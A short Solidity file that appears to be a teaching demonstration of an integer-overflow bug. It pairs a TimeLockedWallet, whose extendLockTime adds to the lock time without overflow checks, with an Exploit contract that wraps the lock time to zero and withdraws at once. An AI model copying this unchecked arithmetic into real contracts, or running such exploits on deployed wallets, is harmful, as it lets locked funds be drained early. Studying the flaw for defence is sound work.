// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

contract TimeLockedWallet {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public unlockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        unlockTime[msg.sender] = block.timestamp + 1 hours;
    }

    function extendLockTime(uint256 _secondsToExtend) public {
        unlockTime[msg.sender] += _secondsToExtend;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(
            block.timestamp > unlockTime[msg.sender],
            "Unlock time not reached"
        );

        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to withdraw funds");
    }
}


contract Exploit {
    TimeLockedWallet timeLockedWallet;

    constructor(TimeLockedWallet _timeLockedWallet) {
        timeLockedWallet = TimeLockedWallet(_timeLockedWallet);
    }

    fallback() external payable {}
    
    receive() external payable {}

    function attack() public payable {
        timeLockedWallet.deposit{value: msg.value}();
        timeLockedWallet.extendLockTime(
            type(uint).max + 1 - timeLockedWallet.unlockTime(address(this))
        );
        timeLockedWallet.withdraw();
    }
}